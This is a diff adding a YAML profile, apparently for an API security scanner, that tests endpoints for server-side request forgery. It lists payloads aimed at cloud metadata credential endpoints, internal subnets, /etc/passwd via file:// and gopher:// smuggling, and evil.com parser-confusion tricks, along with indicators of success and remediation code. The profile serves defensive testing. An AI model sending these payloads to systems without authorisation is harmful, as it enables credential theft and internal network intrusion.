@@ -1,0 +1,216 @@
+# SSRF (Server-Side Request Forgery) - Basic Attack Profile
+# Detects endpoints that can be manipulated into making unintended server-side
+# requests, potentially exposing internal infrastructure, cloud metadata
+# services, or internal APIs.
+
+name: "SSRF - Basic Server-Side Request Forgery"
+category: "request-forgery"
+severity: "critical"
+description: >
+  Tests for basic SSRF vulnerabilities via URL parameters, path segments, and
+  JSON/XML body fields. Covers cloud metadata probing, IP obfuscation bypass
+  techniques, internal network scanning, and blind SSRF detection using
+  response time deltas and internal IP disclosure patterns.
+
+# Fields commonly vulnerable to SSRF injection
+target_fields:
+  - "url"
+  - "endpoint"
+  - "uri"
+  - "href"
+  - "link"
+  - "redirect"
+  - "callback"
+  - "webhook"
+  - "proxy"
+  - "dest"
+  - "destination"
+  - "fetch"
+  - "target"
+  - "source"
+  - "feed"
+  - "image_url"
+  - "avatar_url"
+  - "host"
+  - "site"
+
+# Attack payloads to test (25+ covering GET and POST vectors)
+payloads:
+  # --- 1. Localhost / loopback access ---
+  - "http://127.0.0.1"
+  - "http://127.0.0.1:80"
+  - "http://127.0.0.1:443"
+  - "http://127.0.0.1:8080"
+  - "http://localhost"
+  - "http://localhost:8080"
+  - "http://localhost/admin"
+  - "http://[::1]"
+  - "http://0.0.0.0"
+
+  # --- 2. Cloud metadata endpoints (AWS) ---
+  - "http://169.254.169.254/latest/meta-data/"
+  - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+  - "http://169.254.169.254/latest/user-data/"
+  - "http://169.254.169.254/latest/dynamic/instance-identity/document"
+
+  # --- 3. Cloud metadata endpoints (GCP) ---
+  - "http://metadata.google.internal/computeMetadata/v1/"
+  - "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+
+  # --- 4. Cloud metadata endpoints (Azure IMDS) ---
+  - "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+  - "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01"
+
+  # --- 5. IP obfuscation bypass techniques ---
+  # Decimal representation
+  - "http://2130706433/"
+  # Hexadecimal representation
+  - "http://0x7f000001/"
+  # Octal representation
+  - "http://0177.0000.0000.0001/"
+  # Shortened localhost forms
+  - "http://127.1/"
+  - "http://0/"
+  # URL-encoded localhost
+  - "http://%31%32%37%2e%30%2e%30%2e%31/"
+  # DNS wildcard services resolving to 127.0.0.1
+  - "http://127.0.0.1.nip.io/"
+  - "http://localtest.me/"
+
+  # --- 6. Internal subnet probes ---
+  - "http://192.168.0.1"
+  - "http://192.168.1.1"
+  - "http://10.0.0.1"
+  - "http://172.16.0.1"
+  - "http://10.0.0.1:9200"
+  - "http://10.0.0.1:6379"
+  - "http://10.0.0.1:27017"
+
+  # --- 7. Protocol smuggling ---
+  - "gopher://127.0.0.1:6379/_INFO"
+  - "dict://127.0.0.1:6379/INFO"
+  - "file:///etc/passwd"
+  - "file:///etc/hosts"
+
+  # --- 8. URL parser confusion ---
+  - "http://evil.com@127.0.0.1/"
+  - "http://127.0.0.1#@evil.com/"
+  - "http://127.0.0.1%2523@evil.com/"
+
+  # --- 9. Redirect-based SSRF ---
+  # NOTE: Effective redirect-based SSRF testing requires a controlled server
+  # (e.g., Burp Collaborator, interactsh, or an owned domain with a redirect rule).
+  # Replace <YOUR_REDIRECT_SERVER> with your controlled endpoint before testing.
+  - "http://<YOUR_REDIRECT_SERVER>/redirect?url=http://169.254.169.254/latest/meta-data/"
+  - "http://<YOUR_REDIRECT_SERVER>/redirect?url=http://127.0.0.1/admin"
+
+# Indicators that suggest successful SSRF exploitation
+success_indicators:
+  response_contains:
+    # AWS metadata indicators
+    - "ami-id"
+    - "instance-id"
+    - "instance-type"
+    - "security-credentials"
+    - "AccessKeyId"
+    - "SecretAccessKey"
+    # GCP metadata indicators
+    - "computeMetadata"
+    - "service-accounts"
+    # Azure metadata indicators
+    - "vmId"
+    - "subscriptionId"
+    # Internal file indicators
+    - "root:x:"
+    # Internal service banners (specific to service response bodies)
+    - "Redis Version"
+    - "MongoDB server version"
+    - "cluster_name"
+    - "PostgreSQL"
+
+  status_codes:
+    - 200
+
+  # Blind SSRF — response time delta detection
+  response_time_gt: 5  # seconds
+
+  # Check redirect Location headers for internal addresses
+  redirect_location_contains:
+    - "169.254.169.254"
+    - "127.0.0.1"
+    - "localhost"
+    - "10.0."
+    - "172.16."
+    - "192.168."
+    - "metadata.google.internal"
+
+  # Cloud-specific headers leaked in response
+  headers_present:
+    - "X-Cloud-Trace-Context"
+    - "X-Goog-"
+
+# How to fix this vulnerability
+remediation: |
+  🔧 How to Fix SSRF Vulnerabilities (CWE-918):
+
+  1. **URL Allowlisting**: Only permit requests to known, trusted domains
+     ```python
+     ALLOWED_HOSTS = {"api.example.com", "cdn.example.com"}
+
+     def is_allowed(url: str) -> bool:
+         parsed = urllib.parse.urlparse(url)
+         return parsed.hostname in ALLOWED_HOSTS
+     ```
+
+  2. **Block Internal IP Ranges**: Deny requests to private/reserved IPs.
+     Resolve DNS once and reuse the IP for the actual request to prevent
+     DNS rebinding (TOCTOU) attacks.
+     ```python
+     import ipaddress
+     import socket
+
+     def validate_and_resolve(hostname: str) -> str:
+         """Resolve hostname, block internal IPs, return safe IP."""
+         try:
+             resolved_ip = socket.gethostbyname(hostname)
+             ip = ipaddress.ip_address(resolved_ip)
+             if ip.is_private or ip.is_loopback or ip.is_link_local:
+                 raise ValueError(f"Blocked internal IP: {resolved_ip}")
+             return resolved_ip  # Use this IP for the actual request
+         except (socket.gaierror, ValueError):
+             raise ValueError(f"Blocked: cannot resolve or internal IP")
+     ```
+
+  3. **Disable Unnecessary Protocols**: Only allow http/https
+     ```python
+     parsed = urllib.parse.urlparse(user_url)
+     if parsed.scheme not in ("http", "https"):
+         raise ValueError("Unsupported protocol")
+     ```
+
+  4. **Block Cloud Metadata Endpoints**:
+     - Use IMDSv2 (token-required) on AWS
+     - Block 169.254.169.254 at the firewall/network level
+     - Set metadata concealment on GCP
+
+  5. **Validate After Redirect Resolution**:
+     - Re-check the final destination URL after following redirects
+     - Limit the number of redirects followed
+
+  6. **Input Normalisation**:
+     - Resolve DNS before applying allowlists to defeat DNS rebinding
+     - Canonicalize IP representations (decimal, octal, hex) before validation
+     - Reject URLs with credentials (user:pass@host)
+
+  OWASP API Security Top 10 (2023) — API7:2023 Server Side Request Forgery
+  covers SSRF flaws where an API fetches a remote resource without validating
+  the user-supplied URL.
+
+references:
+  - "https://cwe.mitre.org/data/definitions/918.html"
+  - "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"
+  - "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"
+  - "https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/"
+  - "https://portswigger.net/web-security/ssrf"
+
+cat_message: "I snuck through the cat flap into the server room! 🐱💻 (SSRF: server made an unintended internal request)"
